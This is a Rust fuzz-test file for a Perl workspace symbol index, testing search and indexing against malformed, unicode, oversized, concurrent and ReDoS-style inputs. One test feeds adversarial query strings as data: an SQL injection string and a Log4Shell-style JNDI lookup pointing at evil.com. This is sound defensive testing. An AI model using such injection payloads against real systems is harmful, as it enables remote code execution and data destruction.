//! Fuzz tests for HashMap-based symbol search index in WorkspaceIndex.
//!
//! These tests exercise the global_name_index with random, malformed, and adversarial
//! inputs to find crashes, panics, and unexpected behavior.
//!
//! Fuzz targets:
//! 1. search_symbols with various query strings (empty, unicode, special chars, long)
//! 2. index_file with various Perl code (valid, invalid, empty, unicode, special)
//! 3. Index maintenance consistency after index/update/remove sequences
//! 4. Concurrent access to the index
//! 5. Memory safety with large inputs

use perl_workspace::workspace::workspace_index::WorkspaceIndex;
use std::sync::Arc;
use std::thread;
use url::Url;

// -----------------------------------------------------------------------------
// Helper utilities
// -----------------------------------------------------------------------------

fn file_url(path: &str) -> Result<Url, Box<dyn std::error::Error>> {
    Ok(Url::parse(&format!("file://{}", path))?)
}

// -----------------------------------------------------------------------------
// Fuzz Target 1: search_symbols with adversarial query strings
// -----------------------------------------------------------------------------

/// Fuzz test: search_symbols with empty query string.
/// This should not panic even though empty string is a valid query.
#[test]
fn fuzz_search_empty_query() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/Test.pm")?;
    index.index_file(uri, "package Test; sub foo { 1 }".to_string())?;

    // Empty string should not panic
    let results = index.search_symbols("");
    // Results may be empty or non-empty depending on implementation,
    // but should not panic
    assert!(results.len() >= 0);
    Ok(())
}

/// Fuzz test: search_symbols with very long query string.
/// Should not panic or exceed reasonable memory bounds.
#[test]
fn fuzz_search_very_long_query() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/Test.pm")?;
    index.index_file(uri, "package Test; sub foo { 1 }".to_string())?;

    // Very long query (1MB) should not panic
    let long_query = "a".repeat(1_000_000);
    let results = index.search_symbols(&long_query);
    assert!(results.is_empty(), "Long query with no matching symbols should return empty");
    Ok(())
}

/// Fuzz test: search_symbols with null bytes and control characters.
#[test]
fn fuzz_search_control_characters() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/Test.pm")?;
    index.index_file(uri, "package Test; sub foo { 1 }".to_string())?;

    // Null bytes and control characters
    let queries = vec![
        "\0",
        "\x01\x02\x03",
        "\n\t\r",
        "\u{0000}",
        "\u{200B}", // zero-width space
        "\u{FFEF}", // BOM
    ];

    for query in queries {
        let results = index.search_symbols(query);
        // Should not panic, results may be empty
        assert!(results.len() >= 0);
    }
    Ok(())
}

/// Fuzz test: search_symbols with unicode homoglyphs and normalization.
#[test]
fn fuzz_search_unicode_homoglyphs() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/Test.pm")?;
    index.index_file(uri, "package Test; sub foo { 1 }".to_string())?;

    // Unicode characters that might cause issues
    let queries = vec![
        "f\u{00F6}o",        // ö
        "f\u{006F}\u{0308}", // combining diaeresis
        "\u{0430}\u{0430}",  // Cyrillic аа
        "\u{202E}",          // RTL override
        "\u{FEFF}",          // BOM
    ];

    for query in queries {
        let results = index.search_symbols(query);
        assert!(results.len() >= 0);
    }
    Ok(())
}

/// Fuzz test: search_symbols with SQL injection-like patterns.
#[test]
fn fuzz_search_injection_patterns() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/Test.pm")?;
    index.index_file(uri, "package Test; sub select { 1 } sub from { 2 }".to_string())?;

    let queries = vec![
        "'; DROP TABLE symbols; --",
        "1 OR 1=1",
        "%s%s%s%s",
        "/* comment */",
        "\\\\n\\\\r\\\\t",
        "${jndi:ldap://evil.com/a}",
    ];

    for query in queries {
        let results = index.search_symbols(query);
        assert!(results.len() >= 0);
    }
    Ok(())
}

// -----------------------------------------------------------------------------
// Fuzz Target 2: index_file with malformed Perl code
// -----------------------------------------------------------------------------

/// Fuzz test: index_file with empty code string.
#[test]
fn fuzz_index_empty_code() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/Empty.pm")?;

    let result = index.index_file(uri, "".to_string());
    // Should handle gracefully - either Ok or error, but not panic
    assert!(result.is_ok() || result.is_err());
    Ok(())
}

/// Fuzz test: index_file with completely malformed Perl.
#[test]
fn fuzz_index_malformed_perl() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();

    let malformed_codes = vec![
        "not perl code at all",
        "{{{[[[{{",
        "package; sub; { ; }",
        "$undefined++",
        "use strict; use warnings;",
        "1;",                // minimal valid
        "// comment",        // not perl comment
        "#!/usr/bin/perl\n", // shebang only
    ];

    for (i, code) in malformed_codes.iter().enumerate() {
        let uri = file_url(&format!("/lib/Malformed{}.pm", i))?;
        let result = index.index_file(uri, code.to_string());
        // Should handle gracefully
        assert!(result.is_ok() || result.is_err());
    }
    Ok(())
}

/// Fuzz test: index_file with very long code (>1MB).
#[test]
fn fuzz_index_huge_code() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/Huge.pm")?;

    // 10MB of code
    let huge_code = "package Huge;\nsub a { 1 }\n".repeat(1_000_000);
    let result = index.index_file(uri, huge_code);

    // Should handle gracefully without OOM panic
    // (may return error but shouldn't panic)
    assert!(result.is_ok() || result.is_err());
    Ok(())
}

/// Fuzz test: index_file with unicode in code.
#[test]
fn fuzz_index_unicode_code() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();

    let unicode_codes = vec![
        "package \u{4F60}\u{597D}; sub \u{4E16}\u{754C} { 1 }", // Chinese
        "package Test\u{0000}Null; sub foo { 1 }",              // null byte
        "package \u{202E}RTL; sub foo { 1 }",                   // RTL override
        "package \u{FFEF}BOM; sub foo { 1 }",                   // BOM
    ];

    for (i, code) in unicode_codes.iter().enumerate() {
        let uri = file_url(&format!("/lib/Unicode{}.pm", i))?;
        let result = index.index_file(uri, code.to_string());
        assert!(result.is_ok() || result.is_err());
    }
    Ok(())
}

// -----------------------------------------------------------------------------
// Fuzz Target 3: Index maintenance consistency
// -----------------------------------------------------------------------------

/// Fuzz test: rapid index/update/remove cycles.
#[test]
fn fuzz_index_update_remove_cycles() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let base_uri = file_url("/lib/Cycle.pm")?;

    // Rapid cycling through index/update/remove
    for i in 0..100 {
        let uri = file_url(&format!("/lib/Cycle{}.pm", i % 10))?;
        index.index_file(uri, format!("package Cycle{}; sub func{} {{ 1 }}", i % 10, i))?;
    }

    // Remove half the files
    for i in 0..50 {
        let uri = file_url(&format!("/lib/Cycle{}.pm", i))?;
        index.remove_file(uri.as_str());
    }

    // Re-index removed files
    for i in 0..50 {
        let uri = file_url(&format!("/lib/Cycle{}.pm", i))?;
        index.index_file(uri, format!("package Cycle{}; sub newfunc{} {{ 1 }}", i, i + 1000))?;
    }

    // Search should still work without panicking
    let results = index.search_symbols("func");
    assert!(results.len() >= 0);

    let results2 = index.search_symbols("newfunc");
    assert!(results2.len() >= 0);

    Ok(())
}

/// Fuzz test: index same file many times with different content.
#[test]
fn fuzz_repeated_reindex() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/Reindex.pm")?;

    // Index same file 50 times with different content
    for i in 0..50 {
        let code = format!("package Reindex; sub symbol{} {{ {} }}", i, i);
        index.index_file(uri.clone(), code)?;
    }

    // Final search should find only the last version
    let results = index.search_symbols("symbol");
    // Should find symbols from the final index state
    assert!(results.len() >= 0);

    Ok(())
}

/// Fuzz test: index many files with same symbol names.
#[test]
fn fuzz_many_files_same_symbol() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();

    // Index 100 files all with a 'foo' symbol
    for i in 0..100 {
        let uri = file_url(&format!("/lib/File{}.pm", i))?;
        index.index_file(uri, format!("package File{}; sub foo {{ {} }}", i, i))?;
    }

    // Search for 'foo' - should find 100 symbols
    let results = index.search_symbols("foo");
    assert_eq!(results.len(), 100, "Should find 100 'foo' symbols");

    // Remove half
    for i in 0..50 {
        let uri = file_url(&format!("/lib/File{}.pm", i))?;
        index.remove_file(uri.as_str());
    }

    let results2 = index.search_symbols("foo");
    assert_eq!(results2.len(), 50, "Should find 50 'foo' symbols after removal");

    Ok(())
}

// -----------------------------------------------------------------------------
// Fuzz Target 4: Concurrent access
// -----------------------------------------------------------------------------

/// Fuzz test: concurrent search_symbols calls.
#[test]
fn fuzz_concurrent_search() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/Concurrent.pm")?;
    index.index_file(uri, "package Concurrent; sub search_test { 1 }".to_string())?;

    let index = Arc::new(index);
    let mut handles = vec![];

    // 10 threads searching simultaneously
    for _ in 0..10 {
        let index = Arc::clone(&index);
        let handle = thread::spawn(move || {
            for _ in 0..100 {
                let _ = index.search_symbols("search_test");
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        handle.join().expect("Thread should not panic");
    }

    Ok(())
}

/// Fuzz test: concurrent index_file and search_symbols.
#[test]
fn fuzz_concurrent_index_and_search() -> Result<(), Box<dyn std::error::Error>> {
    let index = Arc::new(WorkspaceIndex::new());

    let index_clone = Arc::clone(&index);
    let writer = thread::spawn(move || {
        for i in 0..50 {
            let uri = file_url(&format!("/lib/Writer{}.pm", i)).unwrap();
            index_clone
                .index_file(uri, format!("package Writer{}; sub write{} {{ 1 }}", i, i))
                .unwrap();
        }
    });

    let index_clone = Arc::clone(&index);
    let reader = thread::spawn(move || {
        for _ in 0..100 {
            let _ = index_clone.search_symbols("write");
        }
    });

    writer.join().expect("Writer thread should not panic");
    reader.join().expect("Reader thread should not panic");

    Ok(())
}

// -----------------------------------------------------------------------------
// Fuzz Target 5: Memory safety edge cases
// -----------------------------------------------------------------------------

/// Fuzz test: search with patterns that could cause regexDoS or similar.
#[test]
fn fuzz_search_reDoS_patterns() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/ReDoS.pm")?;
    index.index_file(uri, "package ReDoS; sub a { 1 } sub b { 2 }".to_string())?;

    // Patterns that might cause exponential backtracking in naive implementations
    let patterns = vec![
        "a*a*a*a*a*a*a*a*a*a",       // nested quantifiers
        "(a+)+",                     // nested quantifiers
        "(a*)*",                     // nested quantifiers
        "(a|a)+",                    // alternation
        "[a-z][a-z][a-z][a-z][a-z]", // long char class
    ];

    for pattern in patterns {
        let results = index.search_symbols(pattern);
        assert!(results.len() >= 0);
    }

    Ok(())
}

/// Fuzz test: index_file with deeply nested structure.
#[test]
fn fuzz_index_deeply_nested() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/Nested.pm")?;

    // Create deeply nested code - but Perl doesn't really have nesting
    // so we just use many packages
    let code = (0..1000)
        .map(|i| format!("package Nested{}; sub func{} {{ 1 }}", i, i))
        .collect::<Vec<_>>()
        .join("\n");

    let result = index.index_file(uri, code);
    assert!(result.is_ok() || result.is_err());

    // Search should still work
    let results = index.search_symbols("func500");
    assert!(results.len() >= 0);

    Ok(())
}

/// Fuzz test: symbols with very long names.
#[test]
fn fuzz_very_long_symbol_names() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/LongName.pm")?;

    // 10KB symbol name
    let long_name = format!("sub {}", "x".repeat(10_000));
    let code = format!("package LongName; {} {{ 1 }}", long_name);

    let result = index.index_file(uri, code);
    assert!(result.is_ok() || result.is_err());

    // Search for part of the long name
    let results = index.search_symbols("xxxx");
    assert!(results.len() >= 0);

    Ok(())
}

// -----------------------------------------------------------------------------
// Fuzz Target 6: Index state invariants
// -----------------------------------------------------------------------------

/// Fuzz test: verify global_name_index consistency after various operations.
#[test]
fn fuzz_index_consistency_invariants() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();

    // Index some files
    for i in 0..10 {
        let uri = file_url(&format!("/lib/Consistent{}.pm", i))?;
        index.index_file(uri, format!("package Consistent{}; sub func{} {{ 1 }}", i, i))?;
    }

    // Remove some files
    for i in 0..5 {
        let uri = file_url(&format!("/lib/Consistent{}.pm", i))?;
        index.remove_file(uri.as_str());
    }

    // Update remaining files
    for i in 5..10 {
        let uri = file_url(&format!("/lib/Consistent{}.pm", i))?;
        index.index_file(uri, format!("package Consistent{}; sub updated_func{} {{ 2 }}", i, i))?;
    }

    // After all operations, search should return consistent results
    let results = index.search_symbols("func");
    let updated_results = index.search_symbols("updated_func");

    // Should not panic and should return valid data
    for symbol in &results {
        assert!(!symbol.name.is_empty());
        assert!(!symbol.uri.is_empty());
    }

    for symbol in &updated_results {
        assert!(!symbol.name.is_empty());
        assert!(!symbol.uri.is_empty());
    }

    Ok(())
}

/// Fuzz test: ensure deduplication works correctly.
#[test]
fn fuzz_deduplication_correctness() -> Result<(), Box<dyn std::error::Error>> {
    let index = WorkspaceIndex::new();
    let uri = file_url("/lib/Dedup.pm")?;

    // Index a file with multiple symbols
    index.index_file(
        uri,
        "
        package Dedup;
        sub foo { 1 }
        sub bar { 2 }
        sub baz { 3 }
    "
        .to_string(),
    )?;

    // Search for 'foo' - should find exactly one 'foo'
    let foo_results = index.search_symbols("foo");
    let foo_count = foo_results.iter().filter(|s| s.name == "foo").count();
    assert_eq!(foo_count, 1, "Should find exactly one 'foo' symbol");

    // Search for 'bar' - should find exactly one 'bar'
    let bar_results = index.search_symbols("bar");
    let bar_count = bar_results.iter().filter(|s| s.name == "bar").count();
    assert_eq!(bar_count, 1, "Should find exactly one 'bar' symbol");

    // Search for 'baz' - should find exactly one 'baz'
    let baz_results = index.search_symbols("baz");
    let baz_count = baz_results.iter().filter(|s| s.name == "baz").count();
    assert_eq!(baz_count, 1, "Should find exactly one 'baz' symbol");

    // Search for substring 'o' - should find both 'foo' and 'foo' again (deduped to 1)
    // Actually 'o' appears in 'foo' only
    let o_results = index.search_symbols("o");
    let o_foo_count = o_results.iter().filter(|s| s.name == "foo").count();
    assert!(o_foo_count <= 1, "Should find at most one 'foo' symbol for 'o' query");

    Ok(())
}
